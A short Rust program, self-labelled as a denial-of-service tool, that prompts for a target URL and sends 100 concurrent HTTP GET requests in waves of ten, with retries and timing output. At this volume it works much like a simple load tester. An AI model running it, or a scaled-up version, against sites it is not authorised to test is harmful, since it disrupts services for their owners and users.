#![allow(unused)]

use text_io::read;
use tokio;
use reqwest;
use std::time::Instant;
use futures::future::join_all;
use std::sync::{Arc, Mutex};

#[tokio::main]
async fn main() -> Result<(), Box<dyn std::error::Error>> {
    println!("***** DoS Started *****\n");
    
    print!("Enter the target URL: ");
    let url: String = read!();

    let num_requests: i32 = 100;
    let concurrency_limit: usize = 10;

    println!("\n[+] URL target: {url}");
    println!("[+] Requests number: {num_requests}");
    println!("[+] Concurrency limit: {concurrency_limit}\n");

    let client: reqwest::Client = reqwest::Client::new();
    
    println!("[+] Sending {} requests to '{}' \n", num_requests, url);

    let start: Instant = Instant::now();

    let error_count = Arc::new(Mutex::new(0));

    for chunk in (0..num_requests).collect::<Vec<_>>().chunks(concurrency_limit) {
        let requests = chunk.iter().map(|_| {
            let client = client.clone();
            let url = url.clone();
            let error_count = Arc::clone(&error_count);
            
            async move {
                let mut retries = 3;
                let timeout_duration = std::time::Duration::from_secs(5);

                while retries > 0 {
                    match tokio::time::timeout(timeout_duration, client.get(&url)
                        .header("X-Sending-Requests", "RequestOverflow")
                        .send()).await {
                        Ok(Ok(resp)) => {
                            println!("[success] status: {}", resp.status());
                            break;
                        }
                        Ok(Err(e)) => {
                            println!("[error] {}", e);
                            let mut count = error_count.lock().unwrap();
                            *count += 1;
                            retries -= 1;
                        }
                        Err(_) => {
                            println!("[error] timeout occurred");
                            let mut count = error_count.lock().unwrap();
                            *count += 1;
                            retries -= 1;
                        }
                    }
                }

                if retries == 0 {
                    println!("[error] all retries failed for request to {}", url);
                }
            }
        });
        
        println!("\n[wave of requests] building load of {} requisitions...", requests.len());
        join_all(requests).await;
    }

    let duration: std::time::Duration = start.elapsed();
    let total_errors = *error_count.lock().unwrap();

    println!("\n\n[+] Total time: {:.2?} seconds", duration);
    println!("[+] Requests per second: {:.2}/s", num_requests as f64 / duration.as_secs_f64());
    println!("[+] Errors: {:?}", total_errors);
    
    println!("\n***** DoS Finished *****");

    Ok(())
}
